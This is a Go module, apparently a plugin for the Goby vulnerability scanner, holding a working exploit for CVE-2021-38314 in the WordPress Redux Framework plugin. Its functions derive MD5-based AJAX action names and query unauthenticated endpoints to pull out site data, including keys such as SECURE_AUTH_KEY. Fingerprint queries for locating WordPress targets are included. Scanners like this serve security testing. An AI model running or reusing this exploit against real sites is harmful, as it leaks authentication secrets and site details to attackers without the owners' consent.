package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress redux-framework Information Disclosure (CVE-2021-38314)",
    "Description": "<p>WordPress is the most popular web page building system in the world.</p><p>Gutenberg template library and Redux framework plugin for WordPress </p>",
    "Impact": "WordPress redux-framework Information Disclosure (CVE-2021-38314)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://redux.io\">https://redux.io</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "WordPress",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "WordPress redux-framework 插件信息泄露漏洞（CVE-2021-38314）",
            "Description": "<p>WordPress是全球最热门的网页搭建系统。</p><p>WordPress 的 Gutenberg 模板库和 Redux 框架插件 <= 4.2.11 在 redux-core/class-redux-core.php 中的 includes 可供未经身份验证的用户使用的 AJAX 操作，攻击者可使用MD5值获取敏感信息，包括插件列表具体信息和SECURE_AUTH_KEY等。</p>",
            "Impact": "<p>WordPress 的 Gutenberg 模板库和 Redux 框架插件 <= 4.2.11 在 redux-core/class-redux-core.php 中的 includes 可供未经身份验证的用户使用的 AJAX 操作，攻击者可使用MD5值获取敏感信息，包括插件列表具体信息和SECURE_AUTH_KEY等。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://redux.io\">https://redux.io</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "WordPress",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "WordPress redux-framework Information Disclosure (CVE-2021-38314)",
            "Description": "<p>WordPress is the most popular web page building system in the world.</p><p>Gutenberg template library and Redux framework plugin for WordPress <= 4.2.11 The includes in redux-core/class-redux-core.php can be used by unauthenticated users to use AJAX operations. Attackers can use MD5 values to get sensitive Information, including specific information of the plug-in list and SECURE_AUTH_KEY, etc.</p>",
            "Impact": "WordPress redux-framework Information Disclosure (CVE-2021-38314)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://redux.io\">https://redux.io</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "WordPress",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\")",
    "GobyQuery": "((body=\"name=\\\"generator\\\" content=\\\"WordPress \" || body=\"name=\\\"generator\\\" content=\\\"WordPress\" || (header=\"X-Pingback\" && header=\"/xmlrpc.php\" && body=\"/wp-includes/\" ) ) || header=\"wordpress_test_cookie\" || banner=\"wordpress_test_cookie\" || header=\"X-Redirect-By: WordPress\" || banner=\"X-Redirect-By: WordPress\" || (body=\"<div class=\\\"wp-die-message\\\">\" && (title=\"WordPress \" || body=\"#error-page .wp-die-message\")) || (body=\"/wp-content/themes/\" && body=\"/wp-includes/js/jquery/\" && (body=\"id='wp-block-library-css\" || body=\"WordPress\" || body=\"wppaDebug\")) || header=\"Cf-Edge-Cache: cache,platform=wordpress\" || header=\"X-Nginx-Cache: WordPress\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://wordpress.com",
    "DisclosureDate": "2021-11-26",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.3",
    "CVEIDs": [
        "CVE-2021-38314"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202109-133"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "WordPress"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10240"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			key1 := fmt.Sprintf("%x", md5.Sum([]byte(u.FixedHostInfo+"/-redux")))
			uri := "/wp-admin/admin-ajax.php?action=" + key1
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp1.StatusCode == 200 && resp1.RawBody != "0" {
				key2 := resp1.RawBody
				key3 := fmt.Sprintf("%x", md5.Sum([]byte(key2+"-support")))
				uri3 := "/wp-admin/admin-ajax.php?action=" + key3
				cfg3 := httpclient.NewGetRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
					return resp3.StatusCode == 200 && strings.Contains(resp3.RawBody, "key") && strings.Contains(resp3.RawBody, "hash")
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			key1 := fmt.Sprintf("%x", md5.Sum([]byte(expResult.HostInfo.FixedHostInfo+"/-redux")))
			uri := "/wp-admin/admin-ajax.php?action=" + key1
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && resp1.StatusCode == 200 && resp1.RawBody != "0" {
				key2 := resp1.RawBody
				key3 := fmt.Sprintf("%x", md5.Sum([]byte(key2+"-support")))
				uri3 := "/wp-admin/admin-ajax.php?action=" + key3
				cfg3 := httpclient.NewGetRequestConfig(uri3)
				cfg3.VerifyTls = false
				cfg3.FollowRedirect = false
				if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil && resp3.StatusCode == 200 {
					expResult.Output = resp3.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
